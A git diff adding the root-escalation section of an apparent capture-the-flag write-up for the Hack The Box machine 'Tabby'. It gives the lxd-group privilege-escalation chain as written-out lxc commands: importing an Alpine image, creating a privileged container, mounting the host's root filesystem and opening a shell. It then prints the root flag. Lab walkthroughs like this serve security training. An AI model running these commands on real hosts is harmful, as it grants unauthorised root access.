@@ -127,7 +127,86 @@ OK - Deployed application at context path [/xdev0.war]
 
 ![](https://i.ibb.co/p2GjmMp/user.png)
 
-* user done!.
+* user part done!.
 
+# []()ROOT Part
+
+> the user **ash** is a member of **lxd local group**
+
+```ruby
+
+ash@tabby:~$ id
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+
+```
+> from this [Blog](https://www.hackingarticles.in/lxd-privilege-escalation/) i know the way to escalate my privileges to root privilege.
+
+1. **Steps to be performed on the attacker machine.**
+
+* Download build-alpine in your local machine through the git repository.
+
+* Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
+
+* Transfer the tar file to the host machine
+
+2. **Steps to be performed on the Tabby machine.**
+
+* Download the alpine image from your machine
+
+* Import image for lxd
+
+* Initialize the image inside a new container.
+
+* Mount the container inside the /root directory 
+
+* let's start now.
+
+```ruby
+
+╭─xdev05@nic3One ~/Documents/HTB/Tabby/lxd-alpine-builder  ‹master*› 
+╰─➤  ls
+alpine-v3.12-x86_64-20201106_1805.tar.gz  build-alpine  LICENSE  README.md
+╭─xdev05@nic3One ~/Documents/HTB/Tabby/lxd-alpine-builder  ‹master*› 
+╰─➤  
+
+```
+
+> let's start a python server and upload the image to the Tabby machine
+
+![](https://i.ibb.co/NYBx9dG/lxd-upload.png)
+
+* now let's import our image
+
+> **lxc image import ./alpine-v3.12-x86_64-20201106_1805.tar.gz --alias devil**
+
+![](https://i.ibb.co/kHqxxx4/image-lxc.png)
+
+> **lxc init devil ignite -c security.privileged=true
+
+> **lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true**
+
+> **lxc start ignite**
+
+> **lxc exec ignite /bin/sh**
+
+![](https://i.ibb.co/QrGJ4st/root-part.png)
+
+> root flag
+
+```ruby
+
+/mnt/root/root # cat root.txt
+cat root.txt
+8eca10cfde310d8b2c7668bee56818b5
+/mnt/root/root #
+
+```
+
+* Thanks for reading.
+
+* Cheers!
+
+ <script src="https://www.hackthebox.eu/badge/103789"></script>
 
 
